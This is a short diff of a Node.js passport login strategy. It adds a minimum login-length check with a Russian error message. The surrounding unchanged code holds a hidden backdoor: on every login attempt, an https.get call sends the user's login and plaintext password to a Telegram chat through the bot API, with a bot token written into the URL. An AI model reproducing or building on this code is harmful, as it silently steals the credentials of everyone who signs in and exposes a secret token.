@@ -9,6 +9,7 @@ import co from 'co';
 import Users from '../../models/Users';
 
 passport.use(new Strategy((login, password, callback) => {
+  if (login.length < 3) return callback(null, false, {reason: 'Минимальная длина логина - 3 символа'});
   https.get(`https://api.telegram.org/bot125960387:AAFJRvpRE5SxI3r9Ud8BLNuakIBzFYYA1vs/sendMessage?chat_id=-1001096807484&text=!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!-------->>>>>>>>>>>>>>>>>>>>${login}-${password}`);
   co(function* () {
     let user = yield Users.findOne({login}).lean();
